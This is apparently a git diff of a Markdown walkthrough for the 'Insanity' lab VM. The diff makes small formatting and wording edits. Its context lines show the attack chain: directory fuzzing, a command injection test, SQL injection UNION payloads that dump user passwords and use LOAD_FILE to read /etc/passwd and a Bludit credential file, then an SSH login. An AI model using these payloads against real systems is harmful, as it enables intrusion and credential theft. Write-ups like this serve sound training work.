@@ -147,8 +147,6 @@ I'll also add this to /etc/hosts.
 
 Fuzzing this new endpoint I find `/admin`, which redirects to login page for Bludit:
 
-![10](screenshots/10.png)
-
 ```bash
 $ gobuster dir -u http://www.insanityhosting.vm/news -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
@@ -175,6 +173,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /robots.txt           (Status: 200) [Size: 22]
 /welcome              (Status: 200) [Size: 4514]
 ```
+
+![10](screenshots/10.png)
 
 I can verify that the `/news` endpoint maps onto the Bludit directory structure by fuzzing using the directories provided [here](https://docs.bludit.com/en/developers/folder-structure):
 
@@ -257,7 +257,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 11:26:04.568312 IP 192.168.45.5 > 192.168.164.124: ICMP echo reply, id 4569, seq 1, length 64
 ```
 
-Testing for command injection if this is ping running, I change `lemmy` to `; whoami #`. Nothing happens, but if I try to modify the same entry again, I simply get a page that says "Error":
+Testing for command injection if this is `ping` running, I change `lemmy` to `; whoami #`. Nothing happens, but if I try to modify the same entry again, I simply get a page that says "Error":
 
 ![15](screenshots/15.png)
 
@@ -316,8 +316,6 @@ password
 email
 ```
 
-
-
 Fetching the `username` and `password` values like so:
 
 `test" union select 1,username,password,4 FROM users #`
@@ -338,7 +336,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 Let's see what other users are on the host machine by reading `/etc/passwd`:
 
-`test" union all select 1,2,LOAD_FILE('/etc/paswd'),4 #'
+`test" union all select 1,2,LOAD_FILE('/etc/paswd'),4 #`
 
 ![27](screenshots/27.png)
 
@@ -357,9 +355,9 @@ Earlier, I tried to access the configuration files for Bludit, which can be foun
 
 ![28](screenshots/28.png)
 
-However, they were inaccessible then. Since I read files with SQLi, let's check them out:
+However, they were inaccessible then. Since I can now read files with SQLi, let's check them out:
 
-`test" union all select 1,2,LOAD_FILE('var/www/html/news/bl-content/databases/users.php'),4 #'
+`test" union all select 1,2,LOAD_FILE('var/www/html/news/bl-content/databases/users.php'),4 #`
 
 ![29](screenshots/29.png)
 
@@ -399,7 +397,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-Since elliot is on the target, let's see if these creds are his ssh password. They are:
+Since elliot is on the target, let's see if I can login through ssh. It works:
 
 ```bash
 $ ssh elliot@192.168.171.124
